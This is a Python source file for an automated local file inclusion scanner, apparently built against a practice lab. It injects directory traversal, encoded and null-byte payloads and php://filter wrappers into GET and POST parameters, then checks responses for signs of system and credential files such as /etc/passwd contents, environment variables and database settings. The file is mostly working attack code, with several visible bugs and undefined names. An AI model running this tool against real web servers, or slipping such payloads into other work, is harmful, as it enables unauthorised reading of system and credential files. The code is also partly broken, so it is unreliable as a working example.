import os, sys, urllib, re, string, requests
import urllib.request
import base64
from urllib import parse
from urllib.parse import urlparse, parse_qs, parse_qsl
from time import sleep
from requests_toolbelt.utils import dump

def make_GET_form(url):
    dic={}
    dic['vuln']='LFI'
    dic['method']='GET'
    dic['url']=url
    return dic

def make_POST_form(url,data):
    dic={}
    dic['vuln']='LFI'
    dic['method']='POST'
    dic['url']=url
    dic['data']=data
    return dic

def complete_url(input_url):
    if not input_url.startswith("http"):
        url = "http://" + input_url
    else:
        url = input_url
    return url

def check_url_get(url):
    res = requests.get(url)
    #Valid
    if res.status_code == 200:
        return True
    else:
        #InValid
        return False

def scan_lfi(url, method):
    go_deeper = "../"
    error = "include("
    null_byte = "%00"

    #Directory Traversal
    if method == "GET":
        keys = []
        values = []

        url_path = url.split("?")[0] + "?"
        url_query = url.split("?")[1]
        
        #more than one query
        if "&" in url_query:
            q = url_query.split("&")
            for i in range(len(q)):
                keys.append(q[i].split("=")[0])
                values.append(q[i].split("=")[1])
            for z in range(len(keys)):
                #(ex)url = url_path + key0 + "=" + () + & + key1 + "=" + () + & + key2 + "=" + ()
                new_url = url.replace(values[z],"#LFI#")
                scan_lfi_func_multi("../",new_url)
                #encoding
                encode_go_deeper = "%2E%2E%2F"
                double_encode_go_deeper = "%252E%252E%252F"
                print("@@Encoding@@")
                scan_lfi_func_multi(encode_go_deeper, new_url)
                print("@@Double Encoding@@")
                scan_lfi_func_multi(double_encode_go_deeper, new_url)
                print("@@PHP filter")
                phpFilter_multi_post(new_url,"#LFI#")


        #one query
        else:
            key=url_query.split("=")[0]
            value = url_query.split("=")[1]
            print("##Dir##")
            for j in range(1,20):
                scan_addr = url_path + key + "=" + (go_deeper*j)
                #print(scan_addr)
                res = requests.get(scan_addr)
                if res.status_code == 200:
                    #print(res.text)
                    if check_success(res.text) == True:
                        print("@@Vnlnerable_../: "+scan_addr)
                        break
                    else:
                        #Path Traversal
                        print("##Path##")
                        with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                            for file_name in f:
                                file_name = file_name.replace("\n", "")
                                scan_addr_path = scan_addr + file_name
                                cookies = {'PHPSESSID': 'ulhd1o6b1jbpopi1e4okrc0gn7', 'security': 'low'}
                                res_path = requests.get(scan_addr_path, cookies=cookies)
                                #print(res_path.status_code)
                                if res_path.status_code == 200:
                                    if check_success(res_path.text) == True:
                                        print("@@Vnlnerable_file_path: "+scan_addr_path)
                                        return make_GET_form(scan_addr_path)
                                else:
                                    #NullByte
                                    print("##Null##")
                                    scan_addr_null = scan_addr_path + null_byte
                                    res_null = requests.get(scan_addr_null)
                                    #print(scan_addr_null)
                                    if res_null.status_code == 200:
                                        if check_success(res_null.text) == True:
                                            print("@@Vnlnerable_null: "+scan_addr_path)
                                            return make_GET_form(scan_addr_path)

            #Encoding Url
            encode_go_deeper = "%2E%2E%2F"
            double_encode_go_deeper = "%252E%252E%252F"
            print("@@Encoding@@")
            scan_lfi_func(encode_go_deeper, url_path, key)
            print("@@Double Encoding@@")
            scan_lfi_func(double_encode_go_deeper, url_path, key)

            #wrapper
            scan_addr_wrapper = url_path + key + "="
            #php://filter
            print("@@php://filter@@")
            with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap:
                for file_name in f_wrap:
                    scan_addr_filter = scan_addr_wrapper + "php://filter/convert.base64-encode/resource="+file_name
                    res_filter = requests.get(scan_addr_filter)
                    if res_filter.status_code == 200:
                        temp = res_filter.text + '='*(4-len(res_filter.text)%4)
                        decode_res_text = base64.b64decode(temp)
                        if "<?php" in str(decode_res_text) or (check_success(res_filter.text)==True):
                            print("@@Vnlnerable_filter/convert/base64"+scan_addr_filter)
                        else:
                            scan_addr_filter_double = scan_addr_wrapper + "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dcv"+parse.quote(file_name,safe='')
                            res_filter_double = requests.get(scan_addr_filter_double)
                            if res_filter_double.status_code == 200:
                                temp_double = res_filter_double.text + '='*(4-len(res_filter_double.text)%4)
                                decode_res_text_double = base64.b64decode(temp_double)
                                if "<?php" in str(decode_res_text_double) or (check_success(res_filter_double.text)==True):
                                    print("@@Vnlnerable_filter/convert/base64(double): "+scan_addr_filter_double)
    elif method == "POST":
        #Need to get POST data -> input()
        #example
        keys_p=['a','b']
        values_p=['1','2']
        #
        encode_go_deeper = "%2E%2E%2F"
        double_encode_go_deeper = "%252E%252E%252F"
        if len(keys_p) == 0 and len(values_p)==0:
            print("none")
        #one param
        elif len(keys_p) == 1 and len(values_p)==1:
            scan_lfi_func_post("../",url,keys_p[0],values_p[0])
            print("@@Encoding@@")
            scan_lfi_func_post(encode_go_deeper,url,keys_p[0],values_p[0])
            print("@@double Encoding")
            scan_lfi_func_post(double_encode_go_deeper,url,keys_p[0],values_p[0])
            print("@@PHP filter")
            with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap_post:
                for file_name_post in f_wrap_post:
                    values_p[0] = "php://filter/convert.base64-encode/resource="+file_name_post
                    data_filter = {keys_p[0]:values_p[0]}
                    res_filter_post = requests.post(url, data_filter)
                    if res_filter_post.status_code == 200:
                        temp_post = res_filter_post.text + '='*(4-len(res_filter_post.text)%4)
                        decode_res_text_post = base64.b64decode(temp_post)
                        if "<?php" in str(decode_res_text_post) or (check_success(res_filter_post.text)==True):
                            print("@@Vnlnerable_filter/convert/base64"+scan_addr_filter_post)
                        else:
                            values_p[0] = "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dcv"+parse.quote(file_name_post,safe='')
                            data_filter_double_post = {keys_p[0]:values_p[0]}
                            res_filter_double_post = requests.post(url, data_filter_double_post)
                            if res_filter_double_post.status_code == 200:
                                temp_double_post = res_filter_double_post.text + '='*(4-len(res_filter_double_post.text)%4)
                                decode_res_text_double_post = base64.b64decode(temp_double_post)
                                if "<?php" in str(decode_res_text_double_post) or (check_success(res_filter_double_post.text)==True):
                                    print("@@Vnlnerable_filter/convert/base64(double): "+data_filter_double_post)
            
            
            
        #more than one
        else:
            for n in range(len(keys_p)):
                new_values_p = values_p[:]
                new_values_p[n] = "#LFI#"
                scan_lfi_func_multi_post("../",url,keys_p,new_values_p)
                #encoding
                encode_go_deeper = "%2E%2E%2F"
                double_encode_go_deeper = "%252E%252E%252F"
                print("@@Encoding@@")
                new_values_p = values_p[:]
                new_values_p[n] = "#LFI#"
                scan_lfi_func_multi_post(encode_go_deeper,url,keys_p,new_values_p)
                print("@@Double Encoding@@")
                new_values_p = values_p[:]
                new_values_p[n] = "#LFI#"
                scan_lfi_func_multi_post(double_encode_go_deeper,url,keys_p,new_values_p)
                #PHP filter
                print("@@PHP filter@@")
                new_values_p = values_p[:]
                new_values_p[n] = "#LFI#"
                phpFilter_multi_post(url,"#LFI#",keys_p,new_values_p)
                

    else:
        print("Invalid Input")

#for one query
def scan_lfi_func(deeper, url_path,key):
    null_byte = "%00"
    #Directory Traversal
    for k in range(1,20):
        scan_addr = url_path + key + "=" + (deeper*k)
        res = requests.get(scan_addr)
        #print(scan_addr)
        if res.status_code == 200:
            if check_success(res.text) == True:
                print("@@Vnlnerable_../: "+scan_addr)
                break
            else:
                #Path Traversal
                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                    for file_name in f:
                        file_name = file_name.replace("\n", "")
                        scan_addr_path = scan_addr + file_name
                        res_path = requests.get(scan_addr_path)
                        #print(scan_addr_path)
                        if res_path.status_code == 200:
                            if check_success(res_path.text) == True:
                                print("@@Vnlnerable_file_path: "+scan_addr_path)
                                return scan_addr_path
                            else:
                                #NullByte
                                scan_addr_null = scan_addr_path + null_byte
                                res_null = requests.get(scan_addr_null)
                                #print(scan_addr_null)
                                if res_null.status_code == 200:
                                    if check_success(res_null.text) == True:
                                        print("@@Vnlnerable_null: "+scan_addr_path)
    return False

def scan_lfi_func_post(deeper, url,key,val):
    null_byte = "%00"
    #Directory Traversal
    for k in range(1,20):
        #scan_addr_ = url_path + key + "=" + (deeper*k)
        val_dir = deeper*k
        data_dir = {key:val_dir}
        #print("##data_dir##" + str(data_dir))
        res = requests.post(url, data = data_dir)
        if res.status_code == 200:
            if check_success(res.text) == True:
                print("@@Vnlnerable_../: "+str(data_dir))
                break
            else:
                #Path Traversal
                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                    for file_name in f:
                        file_name = file_name.replace("\n", "")
                        val_path = val_dir+file_name
                        data_path={key:val_path}
                        #print("##data_path##" + str(data_path))
                        res_path = requests.post(url,data = data_path)
                        if res_path.status_code == 200:
                            if check_success(res_path.text) == True:
                                print("@@Vnlnerable_file_path: "+str(data_path))
                                return str(data_path)
                            else:
                                #NullByte
                                val_null = val_path + null_byte
                                data_null = {key:val_null}
                                #print("##data_null##" + str(data_null))
                                res_null = requests.post(url, data_null)
                                if res_null.status_code == 200:
                                    if check_success(res_null.text) == True:
                                        print("@@Vnlnerable_null: "+str(data_null))
    return False

#for more query
def scan_lfi_func_multi(deeper, url):
    null_byte = "%00"
    #Directory Traversal
    for q in range(1,20):
        #new_url = url.replace(values[z],"#LFI#")
        scan_addr = url.replace("#LFI#",deeper*q)
        res = requests.get(scan_addr)
        #print(scan_addr)
        if res.status_code == 200:
            if check_success(res.text) == True:
                print("@@Vnlnerable_../: "+scan_addr)
                break
            else:
                #Path Traversal
                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                    for file_name in f:
                        file_name = file_name.replace("\n", "")
                        scan_addr_path = url.replace("#LFI#",deeper*q+ file_name)
                        res_path = requests.get(scan_addr_path)
                        #print(scan_addr_path)
                        if res_path.status_code == 200:
                            if check_success(res_path.text) == True:
                                print("@@Vnlnerable_file_path: "+scan_addr_path)
                                return scan_addr_path
                            else:
                                #NullByte
                                scan_addr_null = url.replace("#LFI#",deeper*q+ file_name+ null_byte)
                                res_null = requests.get(scan_addr_null)
                                #print(scan_addr_null)
                                if res_null.status_code == 200:
                                    if check_success(res_null.text) == True:
                                        print("@@Vnlnerable_null: "+scan_addr_null)
    return False                                    

def scan_lfi_func_multi_post(deeper, url,key,val):
    null_byte = "%00"
    where = val.index("#LFI#")
    #Directory Traversal
    for k in range(1,20):
        #scan_addr_ = url_path + key + "=" + (deeper*k)
        val[where] = deeper*k
        data_dir = dict(zip(key,val))
        #print(data_dir)
        #print("##data_dir##" + str(data_dir))
        res = requests.post(url, data = data_dir)
        if res.status_code == 200:
            if check_success(res.text) == True:
                print("@@Vnlnerable_../: "+str(data_dir))
                break
            else:
                #Path Traversal
                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                    for file_name in f:
                        file_name = file_name.replace("\n", "")
                        val[where] = deeper*k+file_name
                        data_path = dict(zip(key,val))
                        #print("##data_path##" + str(data_path))
                        res_path = requests.post(url,data = data_path)
                        if res_path.status_code == 200:
                            if check_success(res_path.text) == True:
                                print("@@Vnlnerable_file_path: "+str(data_path))
                                return str(data_path)
                            else:
                                #NullByte
                                val[where] = deeper*k+file_name + null_byte
                                data_null = dict(zip(key,val))
                                #print("##data_null##" + str(data_null))
                                res_null = requests.post(url, data_null)
                                if res_null.status_code == 200:
                                    if check_success(res_null.text) == True:
                                        print("@@Vnlnerable_null: "+str(data_null))
    return False   

def phpFilter_multi(url,word):
    with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap:
        for file_name in f_wrap:
            file_name = file_name.replace("\n", "")
            scan_addr_filter = url.replace(word,"php://filter/convert.base64-encode/resource="+file_name)
            res_filter = requests.get(scan_addr_filter)
            if res_filter.status_code == 200:
                temp = res_filter.text + '='*(4-len(res_filter.text)%4)
                decode_res_text = base64.b64decode(temp)
                if "<?php" in str(decode_res_text) or (check_success(res_filter.text)==True):
                    print("@@Vnlnerable_filter/convert/base64"+scan_addr_filter)
                else:
                    scan_addr_filter_double = url.replace(word, "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dcv"+parse.quote(file_name,safe=''))
                    res_filter_double = requests.get(scan_addr_filter_double)
                    if res_filter_double.status_code == 200:
                        temp_double = res_filter_double.text + '='*(4-len(res_filter_double.text)%4)
                        decode_res_text_double = base64.b64decode(temp_double)
                        if "<?php" in str(decode_res_text_double) or (check_success(res_filter_double.text)==True):
                            print("@@Vnlnerable_filter/convert/base64(double): "+scan_addr_filter_double)
    return False   

def phpFilter_multi_post(url,word,key,value):
    where = value.index("#LFI#")
    with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap:
        for file_name in f_wrap:
            file_name = file_name.replace("\n", "")
            value[where] = "php://filter/convert.base64-encode/resource="+file_name
            data = dict(zip(key,value))
            res_filter = requests.post(url,data=data)
            if res_filter.status_code == 200:
                temp = res_filter.text + '='*(4-len(res_filter.text)%4)
                decode_res_text = base64.b64decode(temp)
                if "<?php" in str(decode_res_text) or (check_success(res_filter.text)==True):
                    print("@@Vnlnerable_filter/convert/base64"+data)
                else:
                    value[where] = "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dcv"+parse.quote(file_name,safe='')
                    data_double = dict(zip(key,value))
                    res_filter_double = requests.post(url, data = data_double)
                    if res_filter_double.status_code == 200:
                        temp_double = res_filter_double.text + '='*(4-len(res_filter_double.text)%4)
                        decode_res_text_double = base64.b64decode(temp_double)
                        if "<?php" in str(decode_res_text_double) or (check_success(res_filter_double.text)==True):
                            print("@@Vnlnerable_filter/convert/base64(double): "+data_double)
    return False   

def check_success(res_text):
    if("root:" in  res_text or ("sbin" in res_text and "nologin" in res_text)  or "DB_NAME" in res_text or "daemon:" in res_text or "DOCUMENT_ROOT=" in res_text or "PATH=" in res_text or "HTTP_USER_AGENT" in res_text or "HTTP_ACCEPT_ENCODING=" in res_text or "users:x" in res_text or ("GET /" in res_text and ("HTTP/1.1" in res_text or "HTTP/1.0" in res_text)) or "apache_port=" in res_text or "cpanel/logs/access" in res_text or "allow_login_autocomplete" in res_text or "database_prefix=" in res_text or "emailusersbandwidth" in res_text or "adminuser=" in res_text):
        return True
    else:
        False

def lfi_attack(raw_url,method):
    url = complete_url(raw_url)
    if method == "GET":
        if check_url_get(url) == True:
            return scan_lfi(url,"GET")
        else:
            print("Invalid")
    elif method == "POST":
        #Need to get POST data(dict)
        if check_url_post(url,data) == True:
            return scan_lfi(url, "POST")
    print("The test is complete")